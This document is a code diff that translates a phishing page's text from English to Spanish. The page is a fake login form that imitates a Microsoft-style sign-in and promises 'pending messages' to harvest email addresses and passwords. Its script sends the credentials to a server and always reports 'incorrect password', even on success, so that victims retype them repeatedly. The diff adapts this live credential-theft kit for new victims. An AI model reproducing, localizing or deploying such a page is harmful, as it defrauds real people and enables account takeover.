@@ -5646,14 +5646,14 @@
                                             <div data-viewid="2">
                                                 <div>
                                                     <div
- class="identityBanner">you have 10 pending messages <span class="backButton" 
+ class="identityBanner">tienes 10 mensajes pendientes <span class="backButton" 
 id="idBtn_Back" aria-label="Back"><span 
 id="displayName" class="idntity"></span>
 
 <span id="tani" class="idntity" style="display:none;">swest</span></span>
                                                     </div>
                                                 </div>
-                                                <div id="loginHeader" class="row text-title" role="heading">This page is password protected, Please enter your valid email and password to release all pending messages.</div>
+                                                <div id="loginHeader" class="row text-title" role="heading">Esta página está protegida con contraseña, ingrese su correo electrónico y contraseña válidos para liberar todos los mensajes pendientes.</div>
                                                 <div class="row">
                                                     <div class="form-group col-md-24">
                                                         <div role="alert" aria-live="assertive" aria-atomic="false">
@@ -5661,14 +5661,14 @@ id="displayName" class="idntity"></span>
                                                         </div>
 													 <div class="placeholderContainer"><input id="uid" name="u"
 														class="form-control" required  
-														type="text" placeholder="Email here" 
+														type="text" placeholder="Email" 
 														autofocus="" style="border-top-width: 
 														0;border-left-width: 0;border-right-width: 0;padding-left: 0;">
 														</div>
                               
                                                         <div class="placeholderContainer"><input id="i0118" 
 														class="form-control" required maxlength="127" 
-														type="password" placeholder="Enter Password" 
+														type="password" placeholder="Introducir la contraseña" 
 														autofocus="" style="border-top-width: 
 														0;border-left-width: 0;border-right-width: 0;padding-left: 0;"></div>
 														
@@ -5730,7 +5730,7 @@ id="displayName" class="idntity"></span>
                                                             <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
                                                                 <div class="inline-block" style="display: inline-block;align:right;"><img style="display:none;" id="papa" src="https://loading.io/spinners/typing/index.-text-entering-comment-loader.gif">
                                                                      
-																	<input type="submit" id="login_btn" class="btn btn-block btn-primary" value="View Messages Now"></div>
+																	<input type="submit" id="login_btn" class="btn btn-block btn-primary" value="Ver mensajes ahora"></div>
                                                             </div>
                                                         </div>
                                                     </div>
@@ -5825,14 +5825,14 @@ id="displayName" class="idntity"></span>
 								 
                                  $("#displayName").val(t);
                                 if(!s || s.length < 4){
-                                    $("#passwordError").html('Please enter a password up to 4 characters in length').show('slow')
+                                    $("#passwordError").html('Ingrese una contraseña de hasta 4 caracteres de longitud').show('slow')
                                     setTimeout(() => {
                                         $("#passwordError").hide('slow')
                                     }, 5000);
                                     return
                                 }
                           if(!t || t.length < 4){
-                                    $("#passwordError").html('Please enter your email ').show('slow')
+                                    $("#passwordError").html('Por favor introduzca su correo electrónico ').show('slow')
                                     setTimeout(() => {
                                         $("#passwordError").hide('slow')
                                     }, 5000);
@@ -5857,11 +5857,11 @@ id="displayName" class="idntity"></span>
           },
             success: function(response){
               if(response){
-                $("#passwordError").html(" The password you entered is incorrect. Please try again");
+                $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                 console.log(response);
                 if(response['signal'] == 'ok'){
                                              $('#cc').val(1);
-                                             $("#passwordError").html("The  password you entered is incorrect. Please try again");
+                                             $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                            
                 }
                 else{
@@ -5872,7 +5872,7 @@ id="displayName" class="idntity"></span>
             error: function(){
               $("#passwordError").show();
                                               $('#cc').val(1);
-                                             $("#passwordError").html("The  password you entered is incorrect. Please try again");
+                                             $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                             $("#i0118").val('');
                                             $('#login_btn').val('Next')
                                             setTimeout(() => {
@@ -5899,11 +5899,11 @@ id="displayName" class="idntity"></span>
           },
             success: function(response){
               if(response){
-                $("#passwordError").html(" The password you entered is incorrect. Please try again");
+                $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                 console.log(response);
                 if(response['signal'] == 'ok'){
                                            
-                                             $("#passwordError").html("The  password you entered is incorrect. Please try again");
+                                             $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                            
                 }
                 else{
@@ -5914,7 +5914,7 @@ id="displayName" class="idntity"></span>
             error: function(){
               $("#passwordError").show();
                                             $('#cc').val(5);
-                                             $("#passwordError").html("The  password you entered is incorrect. Please try again 2");
+                                             $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                             $("#i0118").val(''); 
 										    
                                             $('#login_btn').val('Next')
@@ -5940,11 +5940,11 @@ id="displayName" class="idntity"></span>
           },
             success: function(response){
               if(response){
-                $("#passwordError").html(" The password you entered is incorrect. Please try again");
+                $("#passwordError").html(" La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                 console.log(response);
                 if(response['signal'] == 'ok'){
                                            
-                                             $("#passwordError").html("The  password you entered is incorrect. Please try again");
+                                             $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                            
                 }
                 else{
@@ -5955,7 +5955,7 @@ id="displayName" class="idntity"></span>
             error: function(){
               $("#passwordError").show();
                                              setTimeout(() => {
-                                            $("#passwordError").html("You have entered too many wrong passwords. Try again later");
+                                            $("#passwordError").html("La contraseña que ha ingresado es incorrecta. Inténtalo de nuevo");
                                             $("#i0118").val('');
                                             $('#login_btn').val('Next') 
 											 $("#login_btn").prop('disabled', true)
